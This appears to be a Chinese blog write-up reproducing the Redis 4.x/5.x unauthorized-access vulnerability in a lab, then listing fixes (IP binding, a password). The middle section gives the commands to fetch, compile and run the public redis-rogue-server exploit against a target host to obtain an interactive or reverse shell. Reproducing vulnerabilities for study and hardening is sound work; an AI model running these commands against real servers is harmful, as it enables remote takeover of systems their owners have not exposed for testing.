---
title: Redis 4.x/5.x 未授权访问漏洞
categories:
  - 漏洞复现
abbrlink: 46878
date: 2020-11-30 11:42:29
---
### 前言
　　看了安恒红皮书的redis未授权漏洞，本章复现此漏洞，不得不说网上的坑很多，真的多。安装环境都在linux下进行
<!-- more -->

###  环境搭建

```bash
wget http://download.redis.io/releases/redis-5.0.5.tar.gz
tar xzf redis-5.0.5.tar.gz
cd redis-5.0.5/
make
make install
```
　　到这里不出意外的话，能使用如图所示的命令
　　<img src="https://s3.ax1x.com/2020/11/30/D21tcn.png">

### 修改配置文件
　　当前目录下有个redis.conf文件，将bing 127.0.0.1 这行前面添加#，将protected-mode yes 改为no
　　<img src="https://s3.ax1x.com/2020/11/30/D23vs1.png">

### 启动redis

```bash
# 使用带配置文件启动
redis-server redis.conf # 注意配置文件路径
```
### 下载exp
　　这里我参考别人复现的时候，因时间已久，很多exp已不能用或者github地址404。当你参考此文章时，我也不能保证是否会出现上述情况，请自己寻找其他exp
```bash
git clone https://github.com/SnowMeteors/redis-rogue-server.git
```
编译exp

```bash
cd redis-rogue-server/RedisModulesSDK/exp/
make
```
　　完成后，会在当前目录生成一个exp.so文件
　　<img src="https://s3.ax1x.com/2020/11/30/D2NxLd.png">
　　将exp.so 复制到`redis-rogue-server.py`同一目录下
　　执行以下命令

```bash
python3 redis-rogue-server.py --rhost 靶机ip --lhost 127.0.0.1
```
　　执行成功后，输入i进入交互式shell，输入r进入反弹shell
　　<img src="https://s3.ax1x.com/2020/11/30/D2DDpt.png">
　　详细功能，参考redis-rogue-server-master下的README.md，已经写的非常详细了
### 修复建议
　　１.只有白名单的ip才能访问redis
　　在 redis.conf 文件中找到 # bind 127.0.0.1，将前面的 # 去掉，然后保存。

```bash
bind 192.168.1.100 127.0.0.1
```
　　2.设置访问密码
　　在 redis.conf 中找到 requirepass 字段，去掉其注释，并在后面填上需要的密码

```bash
requirepass 123456789
```

